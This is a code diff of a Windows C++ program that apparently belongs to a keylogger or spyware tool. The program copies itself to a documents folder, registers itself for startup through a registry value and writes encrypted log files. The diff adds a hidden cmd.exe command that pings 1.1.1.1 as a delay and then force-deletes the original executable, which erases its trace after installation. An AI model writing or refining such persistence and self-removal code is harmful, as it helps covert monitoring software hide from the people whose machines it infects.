@@ -6,17 +6,14 @@
 #include <process.h>
 #include <Psapi.h>
 #include <Winuser.h>
+#include <strsafe.h>
 
+#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
 using namespace std;
 
 #define DEST_PATH "D:\\Documents"
 #define LOGS_PATH "D:\\Documents\\logs"
 
-void deleteFileAfterExit(void* filePath)
-{
-    const char* current_script = static_cast<const char*>(filePath);
-    DeleteFile(current_script);
-}
 
 void copy_addStart_del(const string& dest_path)
 {
@@ -45,24 +42,31 @@ void copy_addStart_del(const string& dest_path)
         RegSetValueEx(hKey, "Script", 0, REG_SZ, (BYTE*)dest_script_path.c_str(), dest_script_path.length() + 1);
         RegCloseKey(hKey);
     }
-    else
-    {
-        cerr << "Error: Unable to open registry key." << endl;
-    }
+    
+    TCHAR szModuleName[MAX_PATH];
+    TCHAR szCmd[2 * MAX_PATH];
+    STARTUPINFO si = {0};
+    PROCESS_INFORMATION pi = {0};
 
-    _beginthread(deleteFileAfterExit, 0, (void*)(dest_script_path.c_str()));
+    GetModuleFileName(NULL, szModuleName, MAX_PATH);
+
+    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
+
+    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
 }
 
-string getCurrentDate()
-{
+string getCurrentDate() {
     SYSTEMTIME systemTime;
     GetLocalTime(&systemTime);
-
-    char buffer[80];
-    sprintf(buffer, "%02d_%02d_%04d", systemTime.wDay, systemTime.wMonth, systemTime.wYear);
-
+    
+    char buffer[50];
+    HRESULT hr = StringCbPrintfA(buffer, sizeof(buffer), "%02d_%02d_%04d", systemTime.wDay, systemTime.wMonth, systemTime.wYear);
     return string(buffer);
 }
+
 
 string getNextLogFileName(string& encryptedLogFileName)
 {
